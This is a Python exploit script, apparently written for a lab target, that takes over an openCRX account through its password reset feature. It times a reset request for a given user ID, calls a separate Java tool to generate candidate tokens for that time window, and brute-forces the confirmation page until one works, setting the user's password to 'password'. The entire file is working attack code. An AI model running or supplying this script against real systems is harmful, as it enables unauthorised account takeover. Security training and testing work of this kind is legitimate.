#!/usr/bin/env python3
import sys
import subprocess
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

target = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"

def main() -> None:
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <user_id>")
        sys.exit(1)

    user_id = sys.argv[1]
    print(f"[+] User ID: {user_id}")
  
    cmd = (
    f"date +%s%3N && "
    f"curl -s -i -X POST --data-binary 'id={user_id}' "
    f"http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp && "
    f"date +%s%3N"
    )

    print(f"[DEBUG] Running command: {cmd}")
    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
    stdout_bytes, _ = proc.communicate()
    raw = stdout_bytes.decode().strip().split("\n")
    print(f"[DEBUG] Raw timestamp output lines ({len(raw)}): {raw!r}")

    start_ts = raw[0].strip()
    end_ts_orig = raw[-1].strip()
    print(f"[DEBUG] Parsed start_ts = {start_ts}, end_ts_orig = {end_ts_orig}")

    end_ts = str(int(end_ts_orig) + 250)
    print(f"[DEBUG] Adjusted end_ts by +250 => {end_ts}")

    print(f"[DEBUG] Generating tokens with java OpenCRXToken {start_ts} {end_ts}")
    with open("tokens.txt", "w") as f:
        subprocess.call(
            f"java OpenCRXToken {start_ts} {end_ts}",
            shell=True,
            stdout=f
        )
    print("[DEBUG] tokens.txt written")

    password = "password"
    with open("tokens.txt", "r") as f:
        for idx, word in enumerate(f, 1):
            token = word.rstrip()
            payload = {
                't': token,
                'p': 'CRX',
                's': 'Standard',
                'id': user_id,
                'password1': password,
                'password2': password
            }
            print(f"[DEBUG] [{idx}] Trying token: {token}")
            print(f"[DEBUG] Payload: {payload!r}")

            r = requests.post(url=target, data=payload)
            print(f"[DEBUG] Response status: {r.status_code}, length: {len(r.text)}")

            if "Unable to reset password" not in r.text:
                print(f"[+++] SUCCESS with token: {token}")
                break
            else:
                print(f"[---] FAIL with token: {token}")

if __name__ == "__main__":
    main()
